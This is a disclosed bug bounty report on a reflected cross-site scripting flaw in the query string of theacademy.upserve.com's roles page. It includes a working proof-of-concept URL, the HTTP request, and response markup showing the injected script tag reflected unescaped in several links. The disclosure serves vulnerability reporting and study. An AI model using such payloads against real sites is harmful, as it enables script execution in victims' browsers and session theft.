# [theacademy.upserve.com] Reflected XSS Query-String

## Report Details
- **Report ID**: 389592
- **URL**: https://hackerone.com/reports/389592
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-08-02T11:35:23.605Z
- **Disclosed**: 2018-10-19T13:24:44.659Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: upserve

## Vulnerability Information
**Steps To Reproduce:**
Open URL in FireFox:
```
https://theacademy.upserve.com/roles/?%22%3E%3Cscript//src=data&colon;,alert(location)//
```

**HTTP Request**
```http
GET /roles/?%22%3E%3Cscript//src=data&colon;,alert(location)// HTTP/1.1
Host: theacademy.upserve.com
```

**HTTP Response**
```html
<a class="category dropdown-item name-sort sorting-desc" href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=name&order=DESC">Name</a>
<a class="category dropdown-item views-sort " href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=views&order=DESC" >Views</a>
<a class="category dropdown-item duration-sort " href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=duration&order=DESC">Duration</a>
```

## Impact

Reflected XSS

## Attachments
No attachments
